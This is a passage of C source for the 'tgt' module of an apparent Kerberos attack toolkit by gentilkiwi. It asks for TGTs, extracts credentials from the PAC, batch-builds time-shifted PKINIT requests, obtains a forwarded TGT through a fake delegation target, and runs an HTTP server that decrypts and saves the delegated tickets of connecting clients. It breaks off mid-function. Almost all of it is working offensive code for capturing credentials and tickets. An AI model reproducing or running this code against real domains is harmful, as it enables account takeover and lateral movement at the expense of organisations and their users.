/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_tgt.h"

const KUHL_M_C kuhl_m_c_tgt[] = {
	{kuhl_m_tgt_ask,	L"ask", L"Ask a TGT with various authentication methods"},
	{kuhl_m_tgt_pac,	L"pac", L"pacman"},
	{kuhl_m_tgt_asreq,	L"asreq", L"PKINIT Mustiness"},
	{kuhl_m_tgt_deleg,	L"deleg", L"Ask a delegate TGT by using a fake target"},
	{kuhl_m_tgt_httpserver, L"http", L"HTTP server to get TGT"},
};
const KUHL_M kuhl_m_tgt = {
	L"tgt",	L"TGT module", NULL,
	ARRAYSIZE(kuhl_m_c_tgt), kuhl_m_c_tgt, NULL, NULL
};

NTSTATUS kuhl_m_tgt_ask(int argc, wchar_t * argv[])
{
	PKIWI_AUTH_INFOS infos;
	PKULL_M_SOCK socket;
	AS_REP *AsRep = NULL;
	EncKDCRepPart *encAsRepPart = NULL;
	PKULL_M_KERBEROS_ASN1_SAVEKDCREP_CALLBACK callback = NULL;

	if(kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL))
		callback = kuhl_m_kerberos_ptt_data;
	if(infos = kull_m_kerberos_asn1_Authinfos_create(argc, argv))
	{
		if(socket = kull_m_kerberos_asn1_net_AddressSocket_create(infos->w_realm, KERBEROS_DEFAULT_PORT, argc, argv, TRUE))
		{
			if(kull_m_kerberos_asn1_AsReqAsRep(infos, socket, NULL, NULL, &AsRep, &encAsRepPart, NULL))
			{
				kull_m_kerberos_asn1_KdcRep_save(AsRep, encAsRepPart, NULL, NULL, callback);
				ossFreePDU(&kull_m_kerberos_asn1_world, EncASRepPart_PDU, encAsRepPart);
				ossFreePDU(&kull_m_kerberos_asn1_world, AS_REP_PDU, AsRep);
			}
			kull_m_kerberos_asn1_net_AddressSocket_delete(socket);
		}
		kull_m_kerberos_asn1_Authinfos_delete(infos);
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_tgt_pac(int argc, wchar_t * argv[])
{
	PKIWI_AUTH_INFOS infos;
	PKULL_M_SOCK socket;
	AS_REP *asrep = NULL;
	EncKDCRepPart *enckdcreppart = NULL;
	EncryptionKey asKey;
	OssBuf TgsReq = {0, NULL};
	TGS_REP *TgsRep = NULL;
	_octet1 pac;

	if(infos = kull_m_kerberos_asn1_Authinfos_create(argc, argv))
	{
		if(socket = kull_m_kerberos_asn1_net_AddressSocket_create(infos->w_realm, KERBEROS_DEFAULT_PORT, argc, argv, TRUE))
		{
			if(kull_m_kerberos_asn1_AsReqAsRep(infos, socket, NULL, NULL, &asrep, &enckdcreppart, &asKey))
			{
				if(kull_m_kerberos_asn1_TgsReq_build(&TgsReq, &asrep->cname, asrep->crealm, &asrep->cname, NULL, KERB_KDCOPTION_standard | KERB_KDCOPTION_enc_tkt_in_skey, &asrep->ticket, &enckdcreppart->key, &asrep->ticket, NULL, NULL))
				{
					if(kull_m_kerberos_asn1_net_callKdcOssBuf(socket, &TgsReq, (LPVOID *) &TgsRep, TGS_REP_PDU))
					{
						if(kull_m_kerberos_asn1_PAC_from_EncTicketPart(&enckdcreppart->key, &TgsRep->ticket.enc_part, &pac))
						{
							if(kull_m_string_args_byName(argc, argv, L"cred", NULL, NULL))
							{
								if(!kuhl_m_tgt_pac_cred(&pac, &asKey))
									PRINT_ERROR(L"No CREDENTIALS_INFO in the PAC\n");
							}
							else kuhl_m_kerberos_pac_info_data((PPACTYPE) pac.value, pac.length, &asKey);
							
							if(pac.value)
								LocalFree(pac.value);
						}
						else PRINT_ERROR(L"No PAC found\n");
						ossFreePDU(&kull_m_kerberos_asn1_world, TGS_REP_PDU, TgsRep);
					}
					ossFreeBuf(&kull_m_kerberos_asn1_world, TgsReq.value);
				}
				if(asKey.keyvalue.value)
					LocalFree(asKey.keyvalue.value);
				ossFreePDU(&kull_m_kerberos_asn1_world, EncASRepPart_PDU, enckdcreppart);
				ossFreePDU(&kull_m_kerberos_asn1_world, AS_REP_PDU, asrep);
			}
			kull_m_kerberos_asn1_net_AddressSocket_delete(socket);
		}
		kull_m_kerberos_asn1_Authinfos_delete(infos);
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_tgt_asreq(int argc, wchar_t * argv[])
{
	PKIWI_AUTH_INFOS authInfo;
	OssBuf AsReq;
	FILETIME fTime, eTime;
	KerberosTime time;
	BOOL isNonce, isSign = TRUE;
	DWORD cookie, i, increment, count;
	LPCWSTR szLifetime;

	CDGenerateRandomBits(&cookie, sizeof(cookie));
	kprintf(L"Cookie value       : %08x\n", cookie);
	if(authInfo = kull_m_kerberos_asn1_Authinfos_create(argc, argv))
	{
		if((authInfo->type == KIWI_AUTH_INFOS_TYPE_RSA_DH) || (authInfo->type == KIWI_AUTH_INFOS_TYPE_OTF_RSA_DH))
		{
			isNonce = authInfo->u.certinfos.dhKeyInfo.dhClientNonce.value && authInfo->u.certinfos.dhKeyInfo.dhClientNonce.length;
			GetSystemTimeAsFileTime(&fTime);
			kprintf(L"> Current time     : "); kull_m_string_displayLocalFileTime(&fTime);
			if(kull_m_string_args_byName(argc, argv, L"startoffset", &szLifetime, NULL))
				*(PULONGLONG) &fTime -= *(PULONGLONG) &fTime % 10000000 - ((LONGLONG) wcstol(szLifetime, NULL, 0) * 10000000 * 60);
			kull_m_string_args_byName(argc, argv, L"increment", &szLifetime, L"10");
			increment = wcstoul(szLifetime, NULL, 0);
			kull_m_string_args_byName(argc, argv, L"count", &szLifetime, L"1");
			count = wcstoul(szLifetime, NULL, 0);
			kprintf(L"\n> Start time       : "); kull_m_string_displayLocalFileTime(&fTime);
			kprintf(L"\n> Increment        : %u mn"
				L"\n> Count            : %u\n", increment, count);
			if(count)
			{
				*(PULONGLONG) &eTime = *(PULONGLONG) &fTime + (ULONGLONG) 10000000 * 60 * increment * (count - 1);
				kprintf(L"> End              : "); kull_m_string_displayLocalFileTime(&eTime); kprintf(L"\n\n");
				for(i = 0; (!g_isBreak && isSign) && (i < count); i++, *(PULONGLONG) &fTime += (ULONGLONG) 10000000 * 60 * increment)
				{
					kull_m_kerberos_asn1_KerberosTime_build_filetime(&time, &fTime, FALSE);
					kprintf(L"* "); kull_m_string_displayLocalFileTime(&fTime); kprintf(L" - ");
					if(isSign = kull_m_kerberos_asn1_AsReq_build(authInfo, &time, NULL, &AsReq))
					{
						isSign = kuhl_m_tgt_asreq_export(cookie, &fTime, authInfo, &AsReq);
						ossFreeBuf(&kull_m_kerberos_asn1_world, AsReq.value);
					}
					if(isNonce)
						CDGenerateRandomBits(authInfo->u.certinfos.dhKeyInfo.dhClientNonce.value, authInfo->u.certinfos.dhKeyInfo.dhClientNonce.length);
				}
			}
			else PRINT_ERROR(L"Invalid count\n");
		}
		else PRINT_ERROR(L"Certificate and Diffie-Hellman mode needed\n");
		kull_m_kerberos_asn1_Authinfos_delete(authInfo);
	}
	return STATUS_SUCCESS;
}

BOOL kuhl_m_tgt_pac_cred(_octet1 *buf, EncryptionKey *AsRepKey)
{
	BOOL status = FALSE;
	PPACTYPE pacType = (PPACTYPE) buf->value;
	DWORD i;
	for(i = 0; i < pacType->cBuffers; i++)
	{
		if(status = pacType->Buffers[i].ulType == PACINFO_TYPE_CREDENTIALS_INFO)
		{
			kuhl_m_kerberos_pac_info_data_credentialinfo((PPAC_CREDENTIAL_INFO) ((PBYTE) pacType + pacType->Buffers[i].Offset), pacType->Buffers[i].cbBufferSize, AsRepKey);
			break;
		}
	}
	return status;
}

BOOL kuhl_m_tgt_asreq_export(DWORD cookie, PFILETIME fTime, PKIWI_AUTH_INFOS authInfo, OssBuf *asReq)
{
	BOOL status = FALSE;
	WCHAR timer[15];
	PWSTR filename;
	size_t charCount = 32 + lstrlen(authInfo->w_short_cname) + lstrlen(authInfo->w_realm); // DWORD - timer - @ .musti + 1
	if(kull_m_string_FileTimeToString(fTime, timer))
	{
		if(filename = (PWSTR) LocalAlloc(LPTR, charCount * sizeof(wchar_t)))
		{
			if(swprintf_s(filename, charCount, L"%08x-%s-%s@%s.musti", cookie, timer, authInfo->w_short_cname, authInfo->w_realm) > 0)
			{
				kprintf(L"%s -> ", filename);
				if(status = kull_m_file_writeData(filename, asReq->value, asReq->length))
					kprintf(L"OK\n");
				else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
			}
			else PRINT_ERROR(L"swprintf_s/buffer\n");
			LocalFree(filename);
		}
	}
	return status;
}

NTSTATUS kuhl_m_tgt_deleg(int argc, wchar_t * argv[])
{
	SECURITY_STATUS status;
	CredHandle hClientCred;
	CtxtHandle hClientCtx;
	SecBuffer SBClientOut = {0, SECBUFFER_TOKEN, NULL};
	SecBufferDesc SBDClientOut = {SECBUFFER_VERSION, 1, &SBClientOut};
	ULONG ClientContextAttr;
	LPCWCHAR szClientTarget;

	PDOMAIN_CONTROLLER_INFO cInfo = NULL;
	LPWSTR target = NULL;
	DWORD ret;

	if(kull_m_string_args_byName(argc, argv, L"target", &szClientTarget, NULL))
		kull_m_string_copy(&target, szClientTarget);
	else
	{
		ret = DsGetDcName(NULL, NULL, NULL, NULL, DS_RETURN_DNS_NAME | DS_IP_REQUIRED, &cInfo);
		if(ret == ERROR_SUCCESS)
		{
			kull_m_string_sprintf(&target, L"HOST/%s", cInfo->DomainControllerName + 2);
			NetApiBufferFree(cInfo);
		}
		else PRINT_ERROR(L"DsGetDcName: %u\n", ret);
	}

	if(target)
	{
		kprintf(L"[delegation target] %s (not used)\n", target);
		status = AcquireCredentialsHandle(NULL, MICROSOFT_KERBEROS_NAME, SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &hClientCred, NULL);
		if(status == SEC_E_OK)
		{
			status = InitializeSecurityContext(&hClientCred, NULL, (SEC_WCHAR *) target, ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH, 0, SECURITY_NATIVE_DREP, NULL, 0, &hClientCtx, &SBDClientOut, &ClientContextAttr, NULL);		
			if((status == SEC_I_CONTINUE_NEEDED) || (status == SEC_E_OK))
			{
				if(ClientContextAttr & ISC_RET_DELEGATE)
					kuhl_m_tgt_deleg_from_negTokenInit(SBClientOut.pvBuffer, SBClientOut.cbBuffer, kuhl_m_tgt_deleg_EncryptionKeyFromCache, target);
				else PRINT_ERROR(L"Client is not allowed to delegate to target\n");

				if(SBClientOut.pvBuffer)
					FreeContextBuffer(SBClientOut.pvBuffer);
				DeleteSecurityContext(&hClientCtx);
			}
			else PRINT_ERROR(L"InitializeSecurityContext: 0x%08x\n", status);
			FreeCredentialHandle(&hClientCred);
		}
		else PRINT_ERROR(L"AcquireCredentialsHandle: 0x%08x\n", status);
		LocalFree(target);
	}
	else PRINT_ERROR(L"Unable to get a target (from /target:... or from DC)\n");
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_tgt_httpserver(int argc, wchar_t * argv[])
{
	int ret, clientAddrSize;
	SOCKET listenSocket, clientSocket;
	SOCKADDR_IN listenAddr = {AF_INET, htons(80), {0}}, clientAddr = {0};
	HANDLE hThread;
	DWORD threadId;
	LPCWSTR szData;
	EncryptionKey myKey;
	PKUHL_M_KERBEROS_HTTP_THREAD_DATA pData;
	LPSTR redirectUrl = NULL;

	if(kull_m_string_args_byName(argc, argv, L"rc4", &szData, NULL) || kull_m_string_args_byName(argc, argv, L"ntlm", &szData, NULL)) // only dealing with RC4, no multiple keys (for now...)
	{
		myKey.keytype = KERB_ETYPE_RC4_HMAC_NT;
		if(NT_SUCCESS(kull_m_kerberos_asn1_crypto_ekey_create_fromHexString(szData, &myKey)))
		{
			if(kull_m_string_args_byName(argc, argv, L"port", &szData, NULL))
				listenAddr.sin_port = htons((USHORT) wcstoul(szData, NULL, 0));
			kprintf(L"Using key  : ");
			kull_m_kerberos_asn1_crypto_ekey_descr(&myKey);
			if(kull_m_string_args_byName(argc, argv, L"redirect", &szData, NULL))
				if(kull_m_string_sprintfA(&redirectUrl, "Location: %S\r\n", szData))
					kprintf(L"Redirect to: %s\n", szData);
			listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			if(listenSocket != INVALID_SOCKET)
			{
				ret = bind(listenSocket, (PSOCKADDR) &listenAddr, sizeof(listenAddr));
				if(ret == ERROR_SUCCESS)
				{
					ret = listen(listenSocket, SOMAXCONN);
					if(ret == ERROR_SUCCESS)
					{
						kprintf(L"Waiting on port %hu...\n", ntohs(listenAddr.sin_port));
						do
						{
							clientAddrSize = sizeof(clientAddr);
							clientSocket = accept(listenSocket, (PSOCKADDR) &clientAddr, &clientAddrSize);
							if(clientSocket != INVALID_SOCKET)
							{
								if(pData = (PKUHL_M_KERBEROS_HTTP_THREAD_DATA) LocalAlloc(LPTR, sizeof(KUHL_M_KERBEROS_HTTP_THREAD_DATA)))
								{
									pData->clientAddr = clientAddr;
									pData->clientSocket = clientSocket;
									pData->key = &myKey;
									pData->aRedirectHeader = redirectUrl;
									if(hThread = CreateThread(NULL, 0, kuhl_m_tgt_httpserver_thread, pData, 0, &threadId))
										CloseHandle(hThread);
									else PRINT_ERROR_AUTO(L"CreateThread");
								}
							}
							else kull_m_sock_error_auto(L"accept");
						} while(TRUE);
					}
					else kull_m_sock_error_auto(L"listen");
				}
				else kull_m_sock_error_auto(L"bind");
				ret = closesocket(listenSocket); //
			}
			else kull_m_sock_error_auto(L"socket");
			if(redirectUrl)
				LocalFree(redirectUrl);
			LocalFree(myKey.keyvalue.value);
		}
	}
	else PRINT_ERROR(L"/rc4 or /ntlm argument is missing\n");
	return STATUS_SUCCESS;
}

DWORD WINAPI kuhl_m_tgt_httpserver_thread(IN LPVOID lpParameter)
{
	PKUHL_M_KERBEROS_HTTP_THREAD_DATA pData = (PKUHL_M_KERBEROS_HTTP_THREAD_DATA) lpParameter;
	PBYTE buf;
	DWORD bufLen, timeout = 2000;
	PSTR authData = NULL;
	OssBuf myBuf;
	int myPdu = GSSAPI_Token_PDU;
	GSSAPI_Token *gssapi_Token = NULL;
	FILETIME fTime;

	GetSystemTimeAsFileTime(&fTime);
	kprintf(L"\n=====> ");
	kull_m_string_displayLocalFileTime(&fTime);
	kprintf(L"\n");
	if(pData)
	{
		kprintf(L"Remote : ");
		kull_m_sock_descr_addrin(&pData->clientAddr);
		setsockopt(pData->clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*) &timeout, sizeof(timeout));
		setsockopt(pData->clientSocket, SOL_SOCKET, SO_SNDTIMEO, (const char*) &timeout, sizeof(timeout));
		if(kuhl_m_tgt_httpserver_recvForMe(pData->clientSocket, &buf, &bufLen))
		{
			if(authData = kuhl_m_tgt_httpserver_dealWithHeaders((LPCSTR) buf, bufLen, "Authorization: "))
			{
				if(pData->aRedirectHeader)
					kuhl_m_tgt_httpserver_sendForMe(pData->clientSocket, 302, "Found", pData->aRedirectHeader);
				else kuhl_m_tgt_httpserver_sendForMe(pData->clientSocket, 403, "Forbidden", NULL);
			}
			else kuhl_m_tgt_httpserver_sendForMe(pData->clientSocket, 401, "Unauthorized", "WWW-Authenticate: Negotiate\r\n");
			LocalFree(buf);
		}
		shutdown(pData->clientSocket, SD_BOTH);
		closesocket(pData->clientSocket);
		if(authData)
		{
			if(kuhl_m_tgt_httpserver_decodeB64NTLMAuth("Negotiate", authData, &myBuf.value, (DWORD *) &myBuf.length))
			{
				if(!ossDecode(&kull_m_kerberos_asn1_world, &myPdu, &myBuf, (LPVOID *) &gssapi_Token))
				{
					kuhl_m_tgt_httpserver_decodeAnyToken(&gssapi_Token->innerToken, pData->key);
					ossFreePDU(&kull_m_kerberos_asn1_world, GSSAPI_Token_PDU, gssapi_Token);
				}
				else PRINT_ERROR(L"Unable to decode GSSAPI_Token: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
				LocalFree(myBuf.value);
			}
			LocalFree(authData);
		}
		LocalFree(pData);
	}
	kprintf(L"=====<\n");
	return ERROR_SUCCESS;
}

BOOL kuhl_m_tgt_httpserver_decodeAnyToken(Any *token, EncryptionKey *key)
{
	BOOL status = FALSE;
	int myPdu = NegotiationToken_PDU;
	NegotiationToken *negotiationToken = NULL;

	if(!ossDecode(&kull_m_kerberos_asn1_world, &myPdu, (OssBuf *) token, (LPVOID *) &negotiationToken))
	{
		if(negotiationToken->choice == negTokenInit_chosen)
		{
			if(negotiationToken->u.negTokenInit.bit_mask & NegTokenInit_mechToken_present)
				kuhl_m_tgt_deleg_from_negTokenInit(negotiationToken->u.negTokenInit.mechToken.value, negotiationToken->u.negTokenInit.mechToken.length, kuhl_m_tgt_deleg_EncryptionKeyFromTicket, key);
		}
		ossFreePDU(&kull_m_kerberos_asn1_world, NegotiationToken_PDU, negotiationToken);
	}
	else PRINT_ERROR(L"Unable to decode GSSAPI_Token: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
	return status;
}

BOOL kuhl_m_tgt_httpserver_decodeB64NTLMAuth(LPCSTR Scheme, LPCSTR b64, PBYTE *data, DWORD *dataLen)
{
	BOOL status = FALSE;
	PSTR tmp;
	size_t off;
	*dataLen = 0;
	*data = NULL;

	if(kull_m_string_sprintfA(&tmp, "%s ", Scheme))
	{
		if(strstr(b64, tmp) == b64)
		{
			off = strlen(tmp);
			if(CryptStringToBinaryA(b64 + off, 0, CRYPT_STRING_BASE64, NULL, dataLen, NULL, NULL))
			{
				if(*data = (PBYTE) LocalAlloc(LPTR, *dataLen))
				{
					if(!(status = CryptStringToBinaryA(b64 + off, 0, CRYPT_STRING_BASE64, *data, dataLen, NULL, NULL)))
					{
						PRINT_ERROR_AUTO(L"CryptStringToBinaryA(data)");
						LocalFree(*data);
						*dataLen = 0;
						*data = NULL;
					}
				}
			}
			else PRINT_ERROR_AUTO(L"CryptStringToBinaryA(init)");
		}
		LocalFree(tmp);
	}
	return status;
}

BOOL kuhl_m_tgt_httpserver_recvForMe(SOCKET clientSocket, LPBYTE *data, DWORD *dataLen)
{
	BOOL status = FALSE, toContinue;
	DWORD t = KULL_M_SOCK_DEFAULT_BUFLEN;
	int iResult;

	*dataLen = 0;
	if(*data = (LPBYTE) LocalAlloc(LPTR, t))
	{
		do
		{
			status = FALSE;
			toContinue = FALSE;
			iResult = recv(clientSocket, (char *) *data + (KULL_M_SOCK_DEFAULT_BUFLEN - t), t, 0);
			if(iResult > 0)
			{
				*dataLen += iResult;
				t -= iResult;
				toContinue = !kull_m_memory_search("\r\n\r\n", 4, *data, *dataLen);
				status = TRUE;
			}
			else if(iResult == 0)
				kull_m_sock_error(0, L"recv/Connection closed");
			else if(WSAGetLastError() != WSAETIMEDOUT)
				kull_m_sock_error_auto(L"recv");
		} while(status && toContinue);
		if(!status)
			LocalFree(*data);
	}
	return status;
}

BOOL kuhl_m_tgt_httpserver_sendForMe(SOCKET clientSocket, USHORT Code, LPCSTR Reason, LPCSTR Header)
{
	BOOL status = FALSE;
	PSTR outBufferA;
	int iResult;
	if(kull_m_string_sprintfA(&outBufferA, "HTTP/1.1 %hu %s\r\n%sConnection: close\r\nContent-Length: 0\r\n\r\n", Code, Reason, Header ? Header : ""))
	{
		iResult = send(clientSocket, outBufferA, lstrlenA(outBufferA), 0);
		if(iResult > 0)
			status = TRUE;
		else if(iResult == 0)
			kull_m_sock_error(0, L"send/Connection closed");
		else if(WSAGetLastError() != WSAETIMEDOUT)
			kull_m_sock_error_auto(L"send");
		LocalFree(outBufferA);
	}
	return status;
}

PSTR kuhl_m_tgt_httpserver_dealWithHeaders(LPCSTR data, DWORD size, LPCSTR toFind)
{
	PSTR buffer, result = NULL;
	char *nextToken, *token, *finder;
	if(kull_m_string_copyA_len(&buffer, data, size))
	{
		for(nextToken = NULL, token = strtok_s(buffer, "\r\n", &nextToken); token && !result; token = strtok_s(NULL, "\r\n", &nextToken))
			if(finder = strstr(token, toFind))
				kull_m_string_copyA(&result, finder + strlen(toFind));
		LocalFree(buffer);
	}
	return result;
}

BOOL kuhl_m_tgt_deleg_from_negTokenInit(LPCVOID data, LONG dataLen, PKUHL_M_KERBEROS_GETENCRYPTIONKEYFROMAPREQ callback, PVOID userdata)
{
	BOOL status = FALSE;
	int toDecPdu = AP_REQ_PDU;
	AP_REQ *ApReq = NULL;
	Authenticator *authenticator = NULL;
	KRB_CRED *KrbCred = NULL;
	OssBuf toDecode = {0, NULL}, DecryptedAuthenticator = {0, NULL}, DecryptedKrbCredEnc = {0, NULL}, PlainKrbCredEnc = {0, NULL};
	NTSTATUS ntStatus;
	EncryptedData previousEncrypted = {0};
	EncryptionKey sessionKey = {0};
	LPWSTR filename;

	if(toDecode.value = kuhl_m_tgt_deleg_searchDataAferOIDInBuffer(data, dataLen))
	{
		if(*(PUSHORT) toDecode.value == TOK_ID_KRB_AP_REQ)
		{
			toDecode.value += sizeof(USHORT);
			toDecode.length = dataLen - (LONG) (toDecode.value - (PBYTE) data);
			if(!ossDecode(&kull_m_kerberos_asn1_world, &toDecPdu, &toDecode, (LPVOID *) &ApReq))
			{
				kprintf(L"Service: ");
				kull_m_kerberos_asn1_PrincipalName_descr(&ApReq->ticket.sname, TRUE);
				kprintf(L"\n");
				if(callback(ApReq, &sessionKey, userdata))
				{
					ntStatus = kull_m_kerberos_asn1_crypto_encrypt(KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, &sessionKey, (OssBuf *) &ApReq->authenticator.cipher, &DecryptedAuthenticator, FALSE);
					if(NT_SUCCESS(ntStatus))
					{
						toDecPdu = Authenticator_PDU;
						if(!ossDecode(&kull_m_kerberos_asn1_world, &toDecPdu, &DecryptedAuthenticator, (LPVOID *) &authenticator))
						{
							kprintf(L"Client : ");
							kull_m_kerberos_asn1_PrincipalName_descr(&authenticator->cname, TRUE);
							kprintf(L"\n");
							if(authenticator->bit_mask & cksum_present)
							{
								if(authenticator->cksum.cksumtype == GSS_CHECKSUM_TYPE)
								{
									if(((PKIWI_AUTHENTICATOR_CKSUM) authenticator->cksum.checksum.value)->Flags & GSS_C_DELEG_FLAG)
									{
										toDecPdu = KRB_CRED_PDU;
										toDecode.length = ((PKIWI_AUTHENTICATOR_CKSUM) authenticator->cksum.checksum.value)->Dlgth;
										toDecode.value = ((PKIWI_AUTHENTICATOR_CKSUM) authenticator->cksum.checksum.value)->Deleg;
										if(!ossDecode(&kull_m_kerberos_asn1_world, &toDecPdu, &toDecode, (LPVOID *) &KrbCred))
										{
											ntStatus = kull_m_kerberos_asn1_crypto_encrypt(KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART, &sessionKey, (OssBuf *) &KrbCred->enc_part.cipher, &DecryptedKrbCredEnc, FALSE);
											if(NT_SUCCESS(ntStatus))
											{
												previousEncrypted = KrbCred->enc_part;
												KrbCred->enc_part.etype = KERB_ETYPE_NULL;
												KrbCred->enc_part.cipher = *(_octet1 *) &DecryptedKrbCredEnc;
												if(filename = kull_m_kerberos_asn1_KrbCred_filename(KrbCred, L"_delegate", NULL))
												{
													if(!ossEncode(&kull_m_kerberos_asn1_world, KRB_CRED_PDU, KrbCred, &PlainKrbCredEnc))
													{
														kprintf(L"> %s -> ", filename);
														if(status = kull_m_file_writeData(filename, PlainKrbCredEnc.value, PlainKrbCredEnc.length))
															kprintf(L"OK\n");
														else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
														ossFreeBuf(&kull_m_kerberos_asn1_world, PlainKrbCredEnc.value);
													}
													else PRINT_ERROR(L"Unable to encode KRB_CRED: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
													LocalFree(filename);
												}
												else PRINT_ERROR(L"Unable to get a filename from KRB_CRED\n");
												KrbCred->enc_part = previousEncrypted;
												LocalFree(DecryptedKrbCredEnc.value);
											}
											else PRINT_ERROR(L"Unable to decrypt KRB_CRED EncryptedData: %08x\n", ntStatus);
											ossFreePDU(&kull_m_kerberos_asn1_world, KRB_CRED_PDU, KrbCred);
										}
										else PRINT_ERROR(L"Unable to decode KRB_CRED: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
									}
									else PRINT_ERROR(L"No GSS_C_DELEG_FLAG in Flags: 0x%08x\n", ((PKIWI_AUTHENTICATOR_CKSUM) authenticator->cksum.checksum.value)->Flags);
								}
								else PRINT_ERROR(L"cksumtype: 0x%08x\n", authenticator->cksum.cksumtype);
							}
							else PRINT_ERROR(L"No cksum in authenticator?");
							ossFreePDU(&kull_m_kerberos_asn1_world, Authenticator_PDU, authenticator);
						}
						else PRINT_ERROR(L"Unable to decode Ticket: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
						LocalFree(DecryptedAuthenticator.value);
					}
					else PRINT_ERROR(L"Unable to decrypt Authenticator: %08x\n", ntStatus);
					LocalFree(sessionKey.keyvalue.value);
				}
				ossFreePDU(&kull_m_kerberos_asn1_world, AP_REQ_PDU, ApReq);
			}
			else PRINT_ERROR(L"Unable to decode AP_REQ: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
		}
		else PRINT_ERROR(L"Unable to find Kerberos TOK_ID_KRB_AP_REQ\n");
	}
	else PRINT_ERROR(L"Unable to find Kerberos OID\n");
	return status;
}

const BYTE	KeberosV5Legacy[] = {0x06, 0x09, 0x2a, 0x86, 0x48, 0x82, 0xf7, 0x12, 0x01, 0x02, 0x02} /* 1.2.840.48018.1.2.2 */,
			KeberosV5[] = {0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02} /* 1.2.840.113554.1.2.2 */;
const OssEncodedOID kerberosOIDs[] = {
	{sizeof(KeberosV5Legacy), (unsigned char *) KeberosV5Legacy},
	{sizeof(KeberosV5), (unsigned char *) KeberosV5},
};
PBYTE kuhl_m_tgt_deleg_searchDataAferOIDInBuffer(IN LPCVOID data, IN SIZE_T Size)
{
	DWORD i;
	PBYTE ret = NULL;
	for(i = 0; (i < ARRAYSIZE(kerberosOIDs)) && !ret; i++)
		ret = (PBYTE) kull_m_memory_search(kerberosOIDs[i].value, kerberosOIDs[i].length, data, Size);
	if(ret)
		ret += kerberosOIDs[i - 1].length;
	return ret;
}

BOOL CALLBACK kuhl_m_tgt_deleg_EncryptionKeyFromCache(AP_REQ *ApReq, EncryptionKey *key, LPVOID UserData)
{
	BOOL status = FALSE;
	NTSTATUS ntStatus, packageStatus;
	USHORT dwTarget;
	DWORD szData;
	PKERB_RETRIEVE_TKT_REQUEST pKerbRetrieveRequest;
	PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;

	dwTarget = (USHORT) ((wcslen((LPCWCHAR) UserData) + 1) * sizeof(wchar_t));
	szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + dwTarget;
	if(pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST) LocalAlloc(LPTR, szData))
	{
		pKerbRetrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
		pKerbRetrieveRequest->CacheOptions = KERB_RETRIEVE_TICKET_USE_CACHE_ONLY;
		pKerbRetrieveRequest->EncryptionType = ApReq->authenticator.etype;
		pKerbRetrieveRequest->TargetName.Length = dwTarget - sizeof(wchar_t);
		pKerbRetrieveRequest->TargetName.MaximumLength  = dwTarget;
		pKerbRetrieveRequest->TargetName.Buffer = (PWSTR) ((PBYTE) pKerbRetrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
		RtlCopyMemory(pKerbRetrieveRequest->TargetName.Buffer, (LPCWCHAR) UserData, pKerbRetrieveRequest->TargetName.MaximumLength);
		ntStatus = LsaCallKerberosPackage(pKerbRetrieveRequest, szData, (PVOID *) &pKerbRetrieveResponse, &szData, &packageStatus);
		if(NT_SUCCESS(ntStatus))
		{
			if(NT_SUCCESS(packageStatus))
			{
				key->keytype = (Int32) pKerbRetrieveResponse->Ticket.SessionKey.KeyType;
				key->keyvalue.length = pKerbRetrieveResponse->Ticket.SessionKey.Length;
				if(key->keyvalue.value = (unsigned char *) LocalAlloc(LPTR, key->keyvalue.length))
				{
					RtlCopyMemory(key->keyvalue.value, pKerbRetrieveResponse->Ticket.SessionKey.Value, key->keyvalue.length);
					status = TRUE;
				}
				LsaFreeReturnBuffer(pKerbRetrieveResponse);
			}
			else if(packageStatus == STATUS_NO_TRUST_SAM_ACCOUNT)
				PRINT_ERROR(L"\'%wZ\' Kerberos name not found!\n", &pKerbRetrieveRequest->TargetName);
			else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : %08x\n", packageStatus);
		}
		else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage : %08x\n", status);
		LocalFree(pKerbRetrieveRequest);
	}
	return status;
}

BOOL CALLBACK kuhl_m_tgt_deleg_EncryptionKeyFromTicket(AP_REQ *ApReq, EncryptionKey *key, LPVOID UserData) // TODO
{
	BOOL status = FALSE;
	NTSTATUS ntStatus;
	OssBuf DecryptedEncTicketPart = {0, NULL};
	EncTicketPart *encticketpart = NULL;
	int toDecPdu = EncTicketPart_PDU;

	key->keytype = 0;
	key->keyvalue.length = 0;
	key->keyvalue.value = NULL;

	ntStatus = kull_m_kerberos_asn1_crypto_encrypt(KRB_KEY_USAGE_AS_REP_TGS_REP, (EncryptionKey *) UserData, (OssBuf *) &ApReq->ticket.enc_part.cipher, &DecryptedEncTicketPart, FALSE);
	if(NT_SUCCESS(ntStatus))
	{
		if(!ossDecode(&kull_m_kerberos_asn1_world, &toDecPdu, &DecryptedEncTicketPart, (LPVOID *) &encticketpart))
		{
			if(ApReq->authenticator.etype == encticketpart->key.keytype)
			{
				key->keytype = encticketpart->key.keytype;
				key->keyvalue.length = encticketpart->key.keyvalue.length;
				if(key->keyvalue.value = (unsigned char *) LocalAlloc(LPTR, key->keyvalue.length))
				{
